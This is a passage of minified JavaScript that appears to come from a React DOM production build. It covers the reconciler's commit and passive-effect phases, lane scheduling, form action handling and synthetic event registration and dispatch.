c=n.shared.hiddenCallbacks;if(c!==null)for(n.shared.hiddenCallbacks=null,n=0;n<c.length;n++)Du(c[n],o)}catch(g){oe(l,l.return,g)}}a&&i&64&&Hr(s),ln(s,s.return);break;case 27:Kr(s);case 26:case 5:It(n,s,a),a&&l===null&&i&4&&Qr(s),ln(s,s.return);break;case 12:It(n,s,a);break;case 31:It(n,s,a),a&&i&4&&$r(n,s);break;case 13:It(n,s,a),a&&i&4&&Wr(n,s);break;case 22:s.memoizedState===null&&It(n,s,a),ln(s,s.return);break;case 30:break;default:It(n,s,a)}t=t.sibling}}function _o(e,t){var a=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(a=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==a&&(e!=null&&e.refCount++,a!=null&&Yl(a))}function To(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Yl(e))}function xt(e,t,a,l){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)Fr(e,t,a,l),t=t.sibling}function Fr(e,t,a,l){var n=t.flags;switch(t.tag){case 0:case 11:case 15:xt(e,t,a,l),n&2048&&an(9,t);break;case 1:xt(e,t,a,l);break;case 3:xt(e,t,a,l),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Yl(e)));break;case 12:if(n&2048){xt(e,t,a,l),e=t.stateNode;try{var s=t.memoizedProps,i=s.id,o=s.onPostCommit;typeof o=="function"&&o(i,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(c){oe(t,t.return,c)}}else xt(e,t,a,l);break;case 31:xt(e,t,a,l);break;case 13:xt(e,t,a,l);break;case 23:break;case 22:s=t.stateNode,i=t.alternate,t.memoizedState!==null?s._visibility&2?xt(e,t,a,l):nn(e,t):s._visibility&2?xt(e,t,a,l):(s._visibility|=2,pl(e,t,a,l,(t.subtreeFlags&10256)!==0||!1)),n&2048&&_o(i,t);break;case 24:xt(e,t,a,l),n&2048&&To(t.alternate,t);break;default:xt(e,t,a,l)}}function pl(e,t,a,l,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var s=e,i=t,o=a,c=l,g=i.flags;switch(i.tag){case 0:case 11:case 15:pl(s,i,o,c,n),an(8,i);break;case 23:break;case 22:var E=i.stateNode;i.memoizedState!==null?E._visibility&2?pl(s,i,o,c,n):nn(s,i):(E._visibility|=2,pl(s,i,o,c,n)),n&&g&2048&&_o(i.alternate,i);break;case 24:pl(s,i,o,c,n),n&&g&2048&&To(i.alternate,i);break;default:pl(s,i,o,c,n)}t=t.sibling}}function nn(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var a=e,l=t,n=l.flags;switch(l.tag){case 22:nn(a,l),n&2048&&_o(l.alternate,l);break;case 24:nn(a,l),n&2048&&To(l.alternate,l);break;default:nn(a,l)}t=t.sibling}}var sn=8192;function hl(e,t,a){if(e.subtreeFlags&sn)for(e=e.child;e!==null;)ed(e,t,a),e=e.sibling}function ed(e,t,a){switch(e.tag){case 26:hl(e,t,a),e.flags&sn&&e.memoizedState!==null&&Bp(a,At,e.memoizedState,e.memoizedProps);break;case 5:hl(e,t,a);break;case 3:case 4:var l=At;At=Cs(e.stateNode.containerInfo),hl(e,t,a),At=l;break;case 22:e.memoizedState===null&&(l=e.alternate,l!==null&&l.memoizedState!==null?(l=sn,sn=16777216,hl(e,t,a),sn=l):hl(e,t,a));break;default:hl(e,t,a)}}function td(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function on(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var l=t[a];qe=l,ld(l,e)}td(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)ad(e),e=e.sibling}function ad(e){switch(e.tag){case 0:case 11:case 15:on(e),e.flags&2048&&ra(9,e,e.return);break;case 3:on(e);break;case 12:on(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,ps(e)):on(e);break;default:on(e)}}function ps(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var l=t[a];qe=l,ld(l,e)}td(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:ra(8,t,t.return),ps(t);break;case 22:a=t.stateNode,a._visibility&2&&(a._visibility&=-3,ps(t));break;default:ps(t)}e=e.sibling}}function ld(e,t){for(;qe!==null;){var a=qe;switch(a.tag){case 0:case 11:case 15:ra(8,a,t);break;case 23:case 22:if(a.memoizedState!==null&&a.memoizedState.cachePool!==null){var l=a.memoizedState.cachePool.pool;l!=null&&l.refCount++}break;case 24:Yl(a.memoizedState.cache)}if(l=a.child,l!==null)l.return=a,qe=l;else e:for(a=e;qe!==null;){l=qe;var n=l.sibling,s=l.return;if(Ir(l),l===a){qe=null;break e}if(n!==null){n.return=s,qe=n;break e}qe=s}}}var ep={getCacheForType:function(e){var t=Ue(_e),a=t.data.get(e);return a===void 0&&(a=e(),t.data.set(e,a)),a},cacheSignal:function(){return Ue(_e).controller.signal}},tp=typeof WeakMap=="function"?WeakMap:Map,se=0,de=null,W=null,F=0,ie=0,ct=null,da=!1,gl=!1,Ro=!1,Zt=0,Se=0,fa=0,Ga=0,Ao=0,ut=0,yl=0,cn=null,Je=null,xo=!1,hs=0,nd=0,gs=1/0,ys=null,ma=null,De=0,pa=null,vl=null,$t=0,Co=0,Oo=null,sd=null,un=0,Do=null;function rt(){return(se&2)!==0&&F!==0?F&-F:_.T!==null?wo():Ec()}function id(){if(ut===0)if((F&536870912)===0||te){var e=An;An<<=1,(An&3932160)===0&&(An=262144),ut=e}else ut=536870912;return e=it.current,e!==null&&(e.flags|=32),ut}function Pe(e,t,a){(e===de&&(ie===2||ie===9)||e.cancelPendingCommit!==null)&&(Sl(e,0),ha(e,F,ut,!1)),Dl(e,a),((se&2)===0||e!==de)&&(e===de&&((se&2)===0&&(Ga|=a),Se===4&&ha(e,F,ut,!1)),Mt(e))}function od(e,t,a){if((se&6)!==0)throw Error(m(327));var l=!a&&(t&127)===0&&(t&e.expiredLanes)===0||Ol(e,t),n=l?np(e,t):Mo(e,t,!0),s=l;do{if(n===0){gl&&!l&&ha(e,t,0,!1);break}else{if(a=e.current.alternate,s&&!ap(a)){n=Mo(e,t,!1),s=!1;continue}if(n===2){if(s=t,e.errorRecoveryDisabledLanes&s)var i=0;else i=e.pendingLanes&-536870913,i=i!==0?i:i&536870912?536870912:0;if(i!==0){t=i;e:{var o=e;n=cn;var c=o.current.memoizedState.isDehydrated;if(c&&(Sl(o,i).flags|=256),i=Mo(o,i,!1),i!==2){if(Ro&&!c){o.errorRecoveryDisabledLanes|=s,Ga|=s,n=4;break e}s=Je,Je=n,s!==null&&(Je===null?Je=s:Je.push.apply(Je,s))}n=i}if(s=!1,n!==2)continue}}if(n===1){Sl(e,0),ha(e,t,0,!0);break}e:{switch(l=e,s=n,s){case 0:case 1:throw Error(m(345));case 4:if((t&4194048)!==t)break;case 6:ha(l,t,ut,!da);break e;case 2:Je=null;break;case 3:case 5:break;default:throw Error(m(329))}if((t&62914560)===t&&(n=hs+300-tt(),10<n)){if(ha(l,t,ut,!da),Cn(l,0,!0)!==0)break e;$t=t,l.timeoutHandle=jd(cd.bind(null,l,a,Je,ys,xo,t,ut,Ga,yl,da,s,"Throttled",-0,0),n);break e}cd(l,a,Je,ys,xo,t,ut,Ga,yl,da,s,null,-0,0)}}break}while(!0);Mt(e)}function cd(e,t,a,l,n,s,i,o,c,g,E,R,y,v){if(e.timeoutHandle=-1,R=t.subtreeFlags,R&8192||(R&16785408)===16785408){R={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:Lt},ed(t,s,R);var N=(s&62914560)===s?hs-tt():(s&4194048)===s?nd-tt():0;if(N=Hp(R,N),N!==null){$t=s,e.cancelPendingCommit=N(gd.bind(null,e,t,s,a,l,n,i,o,c,E,R,null,y,v)),ha(e,s,i,!g);return}}gd(e,t,s,a,l,n,i,o,c)}function ap(e){for(var t=e;;){var a=t.tag;if((a===0||a===11||a===15)&&t.flags&16384&&(a=t.updateQueue,a!==null&&(a=a.stores,a!==null)))for(var l=0;l<a.length;l++){var n=a[l],s=n.getSnapshot;n=n.value;try{if(!nt(s(),n))return!1}catch{return!1}}if(a=t.child,t.subtreeFlags&16384&&a!==null)a.return=t,t=a;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function ha(e,t,a,l){t&=~Ao,t&=~Ga,e.suspendedLanes|=t,e.pingedLanes&=~t,l&&(e.warmLanes|=t),l=e.expirationTimes;for(var n=t;0<n;){var s=31-lt(n),i=1<<s;l[s]=-1,n&=~i}a!==0&&vc(e,a,t)}function vs(){return(se&6)===0?(rn(0),!1):!0}function ko(){if(W!==null){if(ie===0)var e=W.return;else e=W,jt=qa=null,Vi(e),ul=null,Vl=0,e=W;for(;e!==null;)Br(e.alternate,e),e=e.return;W=null}}function Sl(e,t){var a=e.timeoutHandle;a!==-1&&(e.timeoutHandle=-1,_p(a)),a=e.cancelPendingCommit,a!==null&&(e.cancelPendingCommit=null,a()),$t=0,ko(),de=e,W=a=Ut(e.current,null),F=t,ie=0,ct=null,da=!1,gl=Ol(e,t),Ro=!1,yl=ut=Ao=Ga=fa=Se=0,Je=cn=null,xo=!1,(t&8)!==0&&(t|=t&32);var l=e.entangledLanes;if(l!==0)for(e=e.entanglements,l&=t;0<l;){var n=31-lt(l),s=1<<n;t|=e[n],l&=~s}return Zt=t,Bn(),a}function ud(e,t){X=null,_.H=Fl,t===cl||t===In?(t=Au(),ie=3):t===Ni?(t=Au(),ie=4):ie=t===oo?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,ct=t,W===null&&(Se=1,os(e,gt(t,e.current)))}function rd(){var e=it.current;return e===null?!0:(F&4194048)===F?bt===null:(F&62914560)===F||(F&536870912)!==0?e===bt:!1}function dd(){var e=_.H;return _.H=Fl,e===null?Fl:e}function fd(){var e=_.A;return _.A=ep,e}function Ss(){Se=4,da||(F&4194048)!==F&&it.current!==null||(gl=!0),(fa&134217727)===0&&(Ga&134217727)===0||de===null||ha(de,F,ut,!1)}function Mo(e,t,a){var l=se;se|=2;var n=dd(),s=fd();(de!==e||F!==t)&&(ys=null,Sl(e,t)),t=!1;var i=Se;e:do try{if(ie!==0&&W!==null){var o=W,c=ct;switch(ie){case 8:ko(),i=6;break e;case 3:case 2:case 9:case 6:it.current===null&&(t=!0);var g=ie;if(ie=0,ct=null,bl(e,o,c,g),a&&gl){i=0;break e}break;default:g=ie,ie=0,ct=null,bl(e,o,c,g)}}lp(),i=Se;break}catch(E){ud(e,E)}while(!0);return t&&e.shellSuspendCounter++,jt=qa=null,se=l,_.H=n,_.A=s,W===null&&(de=null,F=0,Bn()),i}function lp(){for(;W!==null;)md(W)}function np(e,t){var a=se;se|=2;var l=dd(),n=fd();de!==e||F!==t?(ys=null,gs=tt()+500,Sl(e,t)):gl=Ol(e,t);e:do try{if(ie!==0&&W!==null){t=W;var s=ct;t:switch(ie){case 1:ie=0,ct=null,bl(e,t,s,1);break;case 2:case 9:if(Tu(s)){ie=0,ct=null,pd(t);break}t=function(){ie!==2&&ie!==9||de!==e||(ie=7),Mt(e)},s.then(t,t);break e;case 3:ie=7;break e;case 4:ie=5;break e;case 7:Tu(s)?(ie=0,ct=null,pd(t)):(ie=0,ct=null,bl(e,t,s,7));break;case 5:var i=null;switch(W.tag){case 26:i=W.memoizedState;case 5:case 27:var o=W;if(i?Fd(i):o.stateNode.complete){ie=0,ct=null;var c=o.sibling;if(c!==null)W=c;else{var g=o.return;g!==null?(W=g,bs(g)):W=null}break t}}ie=0,ct=null,bl(e,t,s,5);break;case 6:ie=0,ct=null,bl(e,t,s,6);break;case 8:ko(),Se=6;break e;default:throw Error(m(462))}}sp();break}catch(E){ud(e,E)}while(!0);return jt=qa=null,_.H=l,_.A=n,se=a,W!==null?0:(de=null,F=0,Bn(),Se)}function sp(){for(;W!==null&&!Of();)md(W)}function md(e){var t=zr(e.alternate,e,Zt);e.memoizedProps=e.pendingProps,t===null?bs(e):W=t}function pd(e){var t=e,a=t.alternate;switch(t.tag){case 15:case 0:t=Mr(a,t,t.pendingProps,t.type,void 0,F);break;case 11:t=Mr(a,t,t.pendingProps,t.type.render,t.ref,F);break;case 5:Vi(t);default:Br(a,t),t=W=fu(t,Zt),t=zr(a,t,Zt)}e.memoizedProps=e.pendingProps,t===null?bs(e):W=t}function bl(e,t,a,l){jt=qa=null,Vi(t),ul=null,Vl=0;var n=t.return;try{if(Im(e,n,t,a,F)){Se=1,os(e,gt(a,e.current)),W=null;return}}catch(s){if(n!==null)throw W=n,s;Se=1,os(e,gt(a,e.current)),W=null;return}t.flags&32768?(te||l===1?e=!0:gl||(F&536870912)!==0?e=!1:(da=e=!0,(l===2||l===9||l===3||l===6)&&(l=it.current,l!==null&&l.tag===13&&(l.flags|=16384))),hd(t,e)):bs(t)}function bs(e){var t=e;do{if((t.flags&32768)!==0){hd(t,da);return}e=t.return;var a=Wm(t.alternate,t,Zt);if(a!==null){W=a;return}if(t=t.sibling,t!==null){W=t;return}W=t=e}while(t!==null);Se===0&&(Se=5)}function hd(e,t){do{var a=Jm(e.alternate,e);if(a!==null){a.flags&=32767,W=a;return}if(a=e.return,a!==null&&(a.flags|=32768,a.subtreeFlags=0,a.deletions=null),!t&&(e=e.sibling,e!==null)){W=e;return}W=e=a}while(e!==null);Se=6,W=null}function gd(e,t,a,l,n,s,i,o,c){e.cancelPendingCommit=null;do Es();while(De!==0);if((se&6)!==0)throw Error(m(327));if(t!==null){if(t===e.current)throw Error(m(177));if(s=t.lanes|t.childLanes,s|=vi,jf(e,a,s,i,o,c),e===de&&(W=de=null,F=0),vl=t,pa=e,$t=a,Co=s,Oo=n,sd=l,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,up(Tn,function(){return Ed(),null})):(e.callbackNode=null,e.callbackPriority=0),l=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||l){l=_.T,_.T=null,n=O.p,O.p=2,i=se,se|=4;try{Pm(e,t,a)}finally{se=i,O.p=n,_.T=l}}De=1,yd(),vd(),Sd()}}function yd(){if(De===1){De=0;var e=pa,t=vl,a=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||a){a=_.T,_.T=null;var l=O.p;O.p=2;var n=se;se|=4;try{Jr(t,e);var s=Yo,i=lu(e.containerInfo),o=s.focusedElem,c=s.selectionRange;if(i!==o&&o&&o.ownerDocument&&au(o.ownerDocument.documentElement,o)){if(c!==null&&mi(o)){var g=c.start,E=c.end;if(E===void 0&&(E=g),"selectionStart"in o)o.selectionStart=g,o.selectionEnd=Math.min(E,o.value.length);else{var R=o.ownerDocument||document,y=R&&R.defaultView||window;if(y.getSelection){var v=y.getSelection(),N=o.textContent.length,G=Math.min(c.start,N),re=c.end===void 0?G:Math.min(c.end,N);!v.extend&&G>re&&(i=re,re=G,G=i);var f=tu(o,G),d=tu(o,re);if(f&&d&&(v.rangeCount!==1||v.anchorNode!==f.node||v.anchorOffset!==f.offset||v.focusNode!==d.node||v.focusOffset!==d.offset)){var h=R.createRange();h.setStart(f.node,f.offset),v.removeAllRanges(),G>re?(v.addRange(h),v.extend(d.node,d.offset)):(h.setEnd(d.node,d.offset),v.addRange(h))}}}}for(R=[],v=o;v=v.parentNode;)v.nodeType===1&&R.push({element:v,left:v.scrollLeft,top:v.scrollTop});for(typeof o.focus=="function"&&o.focus(),o=0;o<R.length;o++){var T=R[o];T.element.scrollLeft=T.left,T.element.scrollTop=T.top}}Ns=!!Qo,Yo=Qo=null}finally{se=n,O.p=l,_.T=a}}e.current=t,De=2}}function vd(){if(De===2){De=0;var e=pa,t=vl,a=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||a){a=_.T,_.T=null;var l=O.p;O.p=2;var n=se;se|=4;try{Xr(e,t.alternate,t)}finally{se=n,O.p=l,_.T=a}}De=3}}function Sd(){if(De===4||De===3){De=0,Df();var e=pa,t=vl,a=$t,l=sd;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?De=5:(De=0,vl=pa=null,bd(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(ma=null),Zs(a),t=t.stateNode,at&&typeof at.onCommitFiberRoot=="function")try{at.onCommitFiberRoot(Cl,t,void 0,(t.current.flags&128)===128)}catch{}if(l!==null){t=_.T,n=O.p,O.p=2,_.T=null;try{for(var s=e.onRecoverableError,i=0;i<l.length;i++){var o=l[i];s(o.value,{componentStack:o.stack})}}finally{_.T=t,O.p=n}}($t&3)!==0&&Es(),Mt(e),n=e.pendingLanes,(a&261930)!==0&&(n&42)!==0?e===Do?un++:(un=0,Do=e):un=0,rn(0)}}function bd(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,Yl(t)))}function Es(){return yd(),vd(),Sd(),Ed()}function Ed(){if(De!==5)return!1;var e=pa,t=Co;Co=0;var a=Zs($t),l=_.T,n=O.p;try{O.p=32>a?32:a,_.T=null,a=Oo,Oo=null;var s=pa,i=$t;if(De=0,vl=pa=null,$t=0,(se&6)!==0)throw Error(m(331));var o=se;if(se|=4,ad(s.current),Fr(s,s.current,i,a),se=o,rn(0,!1),at&&typeof at.onPostCommitFiberRoot=="function")try{at.onPostCommitFiberRoot(Cl,s)}catch{}return!0}finally{O.p=n,_.T=l,bd(e,t)}}function _d(e,t,a){t=gt(a,t),t=io(e.stateNode,t,2),e=oa(e,t,2),e!==null&&(Dl(e,2),Mt(e))}function oe(e,t,a){if(e.tag===3)_d(e,e,a);else for(;t!==null;){if(t.tag===3){_d(t,e,a);break}else if(t.tag===1){var l=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof l.componentDidCatch=="function"&&(ma===null||!ma.has(l))){e=gt(a,e),a=Tr(2),l=oa(t,a,2),l!==null&&(Rr(a,l,t,e),Dl(l,2),Mt(l));break}}t=t.return}}function qo(e,t,a){var l=e.pingCache;if(l===null){l=e.pingCache=new tp;var n=new Set;l.set(t,n)}else n=l.get(t),n===void 0&&(n=new Set,l.set(t,n));n.has(a)||(Ro=!0,n.add(a),e=ip.bind(null,e,t,a),t.then(e,e))}function ip(e,t,a){var l=e.pingCache;l!==null&&l.delete(t),e.pingedLanes|=e.suspendedLanes&a,e.warmLanes&=~a,de===e&&(F&a)===a&&(Se===4||Se===3&&(F&62914560)===F&&300>tt()-hs?(se&2)===0&&Sl(e,0):Ao|=a,yl===F&&(yl=0)),Mt(e)}function Td(e,t){t===0&&(t=yc()),e=Da(e,t),e!==null&&(Dl(e,t),Mt(e))}function op(e){var t=e.memoizedState,a=0;t!==null&&(a=t.retryLane),Td(e,a)}function cp(e,t){var a=0;switch(e.tag){case 31:case 13:var l=e.stateNode,n=e.memoizedState;n!==null&&(a=n.retryLane);break;case 19:l=e.stateNode;break;case 22:l=e.stateNode._retryCache;break;default:throw Error(m(314))}l!==null&&l.delete(t),Td(e,a)}function up(e,t){return Ks(e,t)}var _s=null,El=null,No=!1,Ts=!1,Lo=!1,ga=0;function Mt(e){e!==El&&e.next===null&&(El===null?_s=El=e:El=El.next=e),Ts=!0,No||(No=!0,dp())}function rn(e,t){if(!Lo&&Ts){Lo=!0;do for(var a=!1,l=_s;l!==null;){if(e!==0){var n=l.pendingLanes;if(n===0)var s=0;else{var i=l.suspendedLanes,o=l.pingedLanes;s=(1<<31-lt(42|e)+1)-1,s&=n&~(i&~o),s=s&201326741?s&201326741|1:s?s|2:0}s!==0&&(a=!0,Cd(l,s))}else s=F,s=Cn(l,l===de?s:0,l.cancelPendingCommit!==null||l.timeoutHandle!==-1),(s&3)===0||Ol(l,s)||(a=!0,Cd(l,s));l=l.next}while(a);Lo=!1}}function rp(){Rd()}function Rd(){Ts=No=!1;var e=0;ga!==0&&Ep()&&(e=ga);for(var t=tt(),a=null,l=_s;l!==null;){var n=l.next,s=Ad(l,t);s===0?(l.next=null,a===null?_s=n:a.next=n,n===null&&(El=a)):(a=l,(e!==0||(s&3)!==0)&&(Ts=!0)),l=n}De!==0&&De!==5||rn(e),ga!==0&&(ga=0)}function Ad(e,t){for(var a=e.suspendedLanes,l=e.pingedLanes,n=e.expirationTimes,s=e.pendingLanes&-62914561;0<s;){var i=31-lt(s),o=1<<i,c=n[i];c===-1?((o&a)===0||(o&l)!==0)&&(n[i]=zf(o,t)):c<=t&&(e.expiredLanes|=o),s&=~o}if(t=de,a=F,a=Cn(e,e===t?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l=e.callbackNode,a===0||e===t&&(ie===2||ie===9)||e.cancelPendingCommit!==null)return l!==null&&l!==null&&Vs(l),e.callbackNode=null,e.callbackPriority=0;if((a&3)===0||Ol(e,a)){if(t=a&-a,t===e.callbackPriority)return t;switch(l!==null&&Vs(l),Zs(a)){case 2:case 8:a=hc;break;case 32:a=Tn;break;case 268435456:a=gc;break;default:a=Tn}return l=xd.bind(null,e),a=Ks(a,l),e.callbackPriority=t,e.callbackNode=a,t}return l!==null&&l!==null&&Vs(l),e.callbackPriority=2,e.callbackNode=null,2}function xd(e,t){if(De!==0&&De!==5)return e.callbackNode=null,e.callbackPriority=0,null;var a=e.callbackNode;if(Es()&&e.callbackNode!==a)return null;var l=F;return l=Cn(e,e===de?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l===0?null:(od(e,l,t),Ad(e,tt()),e.callbackNode!=null&&e.callbackNode===a?xd.bind(null,e):null)}function Cd(e,t){if(Es())return null;od(e,t,!0)}function dp(){Tp(function(){(se&6)!==0?Ks(pc,rp):Rd()})}function wo(){if(ga===0){var e=il;e===0&&(e=Rn,Rn<<=1,(Rn&261888)===0&&(Rn=256)),ga=e}return ga}function Od(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:Mn(""+e)}function Dd(e,t){var a=t.ownerDocument.createElement("input");return a.name=t.name,a.value=t.value,e.id&&a.setAttribute("form",e.id),t.parentNode.insertBefore(a,t),e=new FormData(e),a.parentNode.removeChild(a),e}function fp(e,t,a,l,n){if(t==="submit"&&a&&a.stateNode===n){var s=Od((n[Xe]||null).action),i=l.submitter;i&&(t=(t=i[Xe]||null)?Od(t.formAction):i.getAttribute("formAction"),t!==null&&(s=t,i=null));var o=new wn("action","action",null,l,n);e.push({event:o,listeners:[{instance:null,listener:function(){if(l.defaultPrevented){if(ga!==0){var c=i?Dd(n,i):new FormData(n);eo(a,{pending:!0,data:c,method:n.method,action:s},null,c)}}else typeof s=="function"&&(o.preventDefault(),c=i?Dd(n,i):new FormData(n),eo(a,{pending:!0,data:c,method:n.method,action:s},s,c))},currentTarget:n}]})}}for(var Uo=0;Uo<yi.length;Uo++){var zo=yi[Uo],mp=zo.toLowerCase(),pp=zo[0].toUpperCase()+zo.slice(1);Rt(mp,"on"+pp)}Rt(iu,"onAnimationEnd"),Rt(ou,"onAnimationIteration"),Rt(cu,"onAnimationStart"),Rt("dblclick","onDoubleClick"),Rt("focusin","onFocus"),Rt("focusout","onBlur"),Rt(km,"onTransitionRun"),Rt(Mm,"onTransitionStart"),Rt(qm,"onTransitionCancel"),Rt(uu,"onTransitionEnd"),Xa("onMouseEnter",["mouseout","mouseover"]),Xa("onMouseLeave",["mouseout","mouseover"]),Xa("onPointerEnter",["pointerout","pointerover"]),Xa("onPointerLeave",["pointerout","pointerover"]),Aa("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Aa("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Aa("onBeforeInput",["compositionend","keypress","textInput","paste"]),Aa("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Aa("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Aa("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var dn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),hp=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(dn));function kd(e,t){t=(t&4)!==0;for(var a=0;a<e.length;a++){var l=e[a],n=l.event;l=l.listeners;e:{var s=void 0;if(t)for(var i=l.length-1;0<=i;i--){var o=l[i],c=o.instance,g=o.currentTarget;if(o=o.listener,c!==s&&n.isPropagationStopped())break e;s=o,n.currentTarget=g;try{s(n)}catch(E){jn(E)}n.currentTarget=null,s=c}else for(i=0;i<l.length;i++){if(o=l[i],c=o.instance,g=o.currentTarget,o=o.listener,c!==s&&n.isPropagationStopped())break e;s=o,n.currentTarget=g;try{s(n)}catch(E){jn(E)}n.currentTarget=null,s=c}}}}function J(e,t){var a=t[$s];a===void 0&&(a=t[$s]=new Set);var l=e+"__bubble";a.has(l)||(Md(t,e,2,!1),a.add(l))}function jo(e,t,a){var l=0;t&&(l|=4),Md(a,e,l,t)}var Rs="_reactListening"+Math.random().toString(36).slice(2);function Bo(e){if(!e[Rs]){e[Rs]=!0,Rc.forEach(function(a){a!=="selectionchange"&&(hp.has(a)||jo(a,!1,e),jo(a,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[Rs]||(t[Rs]=!0,jo("selectionchange",!1,t))}}function Md(e,t,a,l){switch(of(t)){case 2:var n=Yp;break;case 8:n=Kp;break;default:n=ec}a=n.bind(null,t,a,e),n=void 0,!ni||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),l?n!==void 0?e.addEventListener(t,a,{capture:!0,passive:n}):e.addEventListener(t,a,!0):n!==void 0?e.addEventListener(t,a,{passive:n}):e.addEventListener(t,a,!1)}function Ho(e,t,a,l,n){var s=l;if((t&1)===0&&(t&2)===0&&l!==null)e:for(;;){if(l===null)return;var i=l.tag;if(i===3||i===4){var o=l.stateNode.containerInfo;if(o===n)break;if(i===4)for(i=l.return;i!==null;){var c=i.tag;if((c===3||c===4)&&i.stateNode.containerInfo===n)return;i=i.return}for(;o!==null;){if(i=Ya(o),i===null)return;if(c=i.tag,c===5||c===6||c===26||c===27){l=s=i;continue e}o=o.parentNode}}l=l.return}Uc(function(){var g=s,E=ai(a),R=[];e:{var y=ru.get(e);if(y!==void 0){var v=wn,N=e;switch(e){case"keypress":if(Nn(a)===0)break e;case"keydown":case"keyup":v=cm;break;case"focusin":N="focus",v=ci;break;case"focusout":N="blur",v=ci;break;case"beforeblur":case"afterblur":v=ci;break;case"click":if(a.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Bc;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=Wf;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=dm;break;case iu:case ou:case cu:v=Ff;break;case uu:v=mm;break;case"scroll":case"scrollend":v=Zf;break;case"wheel":v=hm;break;case"copy":case"cut":case"paste":v=tm;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Gc;break;case"toggle":case"beforetoggle":v=ym}var G=(t&4)!==0,re=!G&&(e==="scroll"||e==="scrollend"),f=G?y!==null?y+"Capture":null:y;G=[];for(var d=g,h;d!==null;){var T=d;if(h=T.stateNode,T=T.tag,T!==5&&T!==26&&T!==27||h===null||f===null||(T=ql(d,f),T!=null&&G.push(fn(d,T,h))),re)break;d=d.return}0<G.length&&(y=new v(y,N,null,a,E),R.push({event:y,listeners:G}))}}if((t&7)===0){e:{if(y=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",y&&a!==ti&&(N=a.relatedTarget||a.fromElement)&&(Ya(N)||N[Qa]))break e;if((v||y)&&(y=E.window===E?E:(y=E.ownerDocument)?y.defaultView||y.parentWindow:window,v?(N=a.relatedTarget||a.toElement,v=g,N=N?Ya(N):null,N!==null&&(re=Y(N),G=N.tag,N!==re||G!==5&&G!==27&&G!==6)&&(N=null)):(v=null,N=g),v!==N)){if(G=Bc,T="onMouseLeave",f="onMouseEnter",d="mouse",(e==="pointerout"||e==="pointerover")&&(G=Gc,T="onPointerLeave",f="onPointerEnter",d="pointer"),re=v==null?y:Ml(v),h=N==null?y:Ml(N),y=new G(T,d+"leave",v,a,E),y.target=re,y.relatedTarget=h,T=null,Ya(E)===g&&(G=new G(f,d+"enter",N,a,E),G.target=h,G.relatedTarget=re,T=G),re=T,v&&N)t:{for(G=gp,f=v,d=N,h=0,T=f;T;T=G(T))h++;T=0;for(var j=d;j;j=G(j))T++;for(;0<h-T;)f=G(f),h--;for(;0<T-h;)d=G(d),T--;for(;h--;){if(f===d||d!==null&&f===d.alternate){G=f;break t}f=G(f),d=G(d)}G=null}else G=null;v!==null&&qd(R,y,v,G,!1),N!==null&&re!==null&&qd(R,re,N,G,!0)}}e:{if(y=g?Ml(g):window,v=y.nodeName&&y.nodeName.toLowerCase(),v==="select"||v==="input"&&y.type==="file")var ae=$c;else if(Ic(y))if(Wc)ae=Cm;else{ae=Am;var w=Rm}else 